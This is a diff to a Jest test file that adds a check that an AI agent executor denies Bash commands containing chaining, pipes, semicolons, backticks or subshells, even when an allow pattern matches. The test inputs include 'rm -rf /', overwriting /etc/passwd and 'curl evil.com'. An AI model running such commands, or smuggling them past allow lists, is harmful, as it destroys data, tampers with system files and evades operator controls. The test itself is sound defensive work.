@@ -487,6 +487,31 @@ describe('ClaudeExecutor', () => {
       expect(r2.behavior).toBe('deny');
     });
 
+    it('should deny commands with shell meta-characters even if pattern matches', async () => {
+      await executor.execute(makeInput({
+        readOnly: true,
+        toolAllow: ['Bash'],
+        bashAllowPatterns: ['^ls', '^python .*/skills/', '^git log'],
+      }));
+      const canUseTool = getCanUseTool();
+
+      // Command chaining via &&
+      const r1 = await canUseTool('Bash', { command: 'ls && rm -rf /' });
+      expect(r1.behavior).toBe('deny');
+      // Pipe
+      const r2 = await canUseTool('Bash', { command: 'git log | tee /etc/passwd' });
+      expect(r2.behavior).toBe('deny');
+      // Semicolon
+      const r3 = await canUseTool('Bash', { command: 'ls; curl evil.com' });
+      expect(r3.behavior).toBe('deny');
+      // Backtick
+      const r4 = await canUseTool('Bash', { command: 'python `malicious`' });
+      expect(r4.behavior).toBe('deny');
+      // $() subshell
+      const r5 = await canUseTool('Bash', { command: 'python $(whoami)/skills/x.py' });
+      expect(r5.behavior).toBe('deny');
+    });
+
     it('should allow all Bash when toolAllow has Bash but no bashAllowPatterns', async () => {
       await executor.execute(makeInput({
         readOnly: true,
